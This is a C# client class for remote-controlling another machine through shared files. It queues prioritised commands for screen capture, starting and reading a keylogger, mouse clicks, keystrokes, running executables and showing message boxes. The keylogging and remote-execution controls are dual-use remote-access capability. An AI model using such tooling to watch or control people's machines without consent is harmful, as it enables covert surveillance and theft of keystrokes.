using System;
using System.Collections.Generic;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using System.Timers;
using System.IO;
using System.Threading;
using System.Windows.Forms;


namespace ClientDll
{
    class FileClient : AbstractClient
    {
        StreamWriter serverStream;
        StreamReader clientStream;
        //  StreamWriter trace;
        string clientStreamName = "client.txt";
        string serverStreamName = "server.txt";
        private const char splitChr = (char)3;
        string LastMsgGuid = string.Empty;
        System.Timers.Timer timer = new System.Timers.Timer();
        bool requestedProcessed = true;

        //Queue<Message> commandQueue = new Queue<Message>();
        OrderedQueue<Message> commandQueue = new OrderedQueue<Message>();
        public FileClient(string communicationFolder)
            : base(communicationFolder)
        {
        }

        private void timer_Elapsed(object sender, EventArgs e)
        {
            if (requestedProcessed && commandQueue.Count > 0)
            {
                requestedProcessed = false;
                SendToServer(commandQueue.Dequeue().MessageText);
            }
        }

        public override bool ConnectToServer(string serverAddress)
        {
            if (Directory.Exists(this.Port + @"\" + serverAddress))
            {
                this.Port += @"\" + serverAddress;
                FileStream fsServer = File.Open(this.Port + @"\" + serverStreamName, FileMode.OpenOrCreate, FileAccess.Write, FileShare.ReadWrite);
                FileStream fsClient = File.Open(this.Port + @"\" + clientStreamName, FileMode.OpenOrCreate, FileAccess.Read, FileShare.ReadWrite);
                serverStream = new StreamWriter(fsServer);
                clientStream = new StreamReader(fsClient);
                commandQueue = new OrderedQueue<Message>();
                timer = new System.Timers.Timer();
                timer.Elapsed += new ElapsedEventHandler(timer_Elapsed);
                timer.Interval = 10;
                
                timer.Start();
                connected = true;
                return true;
            }
            else
                return false;
        }

        public override bool DisConnectServer()
        {
            timer.Stop();
            timer.Dispose();
            SendToServer("disconnect");
            connected = false;
            serverStream.Dispose();
            clientStream.Dispose();
            return true;
        }

        public override System.Drawing.Image GetScreen()
        {
            Image img = null;
            SendMessage(new Message("img^io", MessagePriority.LOW));
            using (StreamReader sr = new StreamReader(this.Port + @"\Screen.jpeg"))
            {
                img = Image.FromStream(sr.BaseStream);
            }
            return img;
        }


        public override string SendMessage(object message)
        {
            commandQueue.Enqueue((Message)message);

          //  if (commandQueue.Count > 5)
            //    MessageBox.Show(commandQueue.Count.ToString());
            return "";
        }


        public string SendToServer(string message)
        {
            int counter = 0;
            string response = string.Empty;
            string messageID = Guid.NewGuid().ToString();
            serverStream.BaseStream.Position = 0;
            message = message + splitChr.ToString() + messageID;
            message = message.PadRight(200, ' ');
            serverStream.Write(message);
            serverStream.Flush();
            clientStream.BaseStream.Position = 0;
            while (counter < 100)
            {
                response = clientStream.ReadLine();

                if (response == null || response.Trim() == "")
                {
                    Thread.Sleep(1000);
                }
                else if (!IsRequestCompeleted(response, messageID))
                {
                    Thread.Sleep(1000);
                }
                else
                {
                    message = " ";
                    message = message.PadRight(100, ' ');
                    System.Text.ASCIIEncoding enc = new System.Text.ASCIIEncoding();
                    serverStream.BaseStream.Write(enc.GetBytes(message), 0, message.Length);
                    requestedProcessed = true;
                    return "";
                }
                counter++;
            }
            if (counter >= 100)
                throw new Exception("No Response from Server");
            return "good";
        }

        private bool IsRequestCompeleted(string message, string messageID)
        {
            string[] arr = message.Split(splitChr);
            if (arr.Length < 2)
                return false;
            if (messageID != arr[1])
                return true;
            else
                return false;
        }

        public override bool StartKeylog()
        {
            SendMessage(new Message("startkeylog^io", MessagePriority.NORMAL));
            return true;
        }

        public override bool Stopkeylog()
        {
            SendMessage(new Message("stopkeylog^io", MessagePriority.NORMAL));
            return true;
        }

        public override string Getkey()
        {
            return SendMessage(new Message("getkey^io", MessagePriority.NORMAL));
        }

        public override bool MouseClickLeft(int x, int y)
        {
            SendMessage(new Message("mouseclickleft^" + x.ToString() + "^" + y.ToString(), MessagePriority.HIGH));
            return true;
        }

        
        public override bool MouseClickRight(int x, int y)
        {
            SendMessage(new Message("mouseclickright^" + x.ToString() + "^" + y.ToString(), MessagePriority.HIGH));
            return true;
        }

        public override bool RunExe(string exe)
        {

            SendMessage(new Message("exe^" + exe, MessagePriority.LOW));
            return true;
        }

        public override bool ShowMessageBox(string message)
        {
            SendMessage(new Message("message^" + message, MessagePriority.LOW));
            return true;
        }

          public override bool SendKey(string key)
        {
            SendMessage(new Message("keyup^" + key, MessagePriority.HIGH));
            return true;
        }


        ~FileClient()
        {
            Dispose(false);

        }


        // Implement IDisposable.
        // Do not make this method virtual.
        // A derived class should not be able to override this method.
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        // Dispose(bool disposing) executes in two distinct scenarios.
        // If disposing equals true, the method has been called directly
        // or indirectly by a user's code. Managed and unmanaged resources
        // can be disposed.
        // If disposing equals false, the method has been called by the 
        // runtime from inside the finalizer and you should not reference 
        // other objects. Only unmanaged resources can be disposed.
        public override void Dispose(bool disposing)
        {
            // Check to see if Dispose has already been called.
            if (!this.disposed)
            {
                // If disposing equals true, dispose all managed 
                // and unmanaged resources.
                if (disposing)
                {
                    // Dispose managed resources.
                    timer.Dispose();
                    if (connected)
                    {
                        SendMessage(new Message("disconnect", MessagePriority.LOW) );
                        clientStream.Dispose();
                        serverStream.Dispose();
                    }

                }
                // Release unmanaged resources. If disposing is false, 
                // only the following code is executed.
                /********CloseHandle(handle);
                handle = IntPtr.Zero;*/
                // Note that this is not thread safe.
                // Another thread could start disposing the object
                // after the managed resources are disposed,
                // but before the disposed flag is set to true.
                // If thread safety is necessary, it must be
                // implemented by the client.
            }
            disposed = true;
        }
    }
    class Message : IComparable<Message>
    {
        MessagePriority messagePriority;
        string messageText;
        public Message(string _messageText, MessagePriority _messagePriority)
        {
            messageText = _messageText;
            messagePriority = _messagePriority;
        }

        internal MessagePriority MessagePriority
        {
            get { return messagePriority; }
        }


        internal string MessageText
        {
            get { return messageText; }
        }

        #region IComparable<Message> Members

        public int CompareTo(Message other)
        {
            if (this.MessagePriority < other.MessagePriority) return 1;
            else
                return -1;
        }

        #endregion
    }
    enum MessagePriority
    {
        LOW, NORMAL, HIGH
    }

    class OrderedQueue<T> where T : IComparable<T>
    {
        SortedList<T, T> sortedList = new SortedList<T, T>();
        public void Enqueue(T item)
        {
            sortedList.Add(item, item);
        }
        public T Dequeue()
        {
            if (sortedList.Count < 1)
                throw new Exception("Queque is Empty");

            T item = sortedList.Keys[0];
            sortedList.RemoveAt(0);
            return item;
        }

        public int Count
        {
            get
            {
                return sortedList.Count;
            }


        }
    }
}
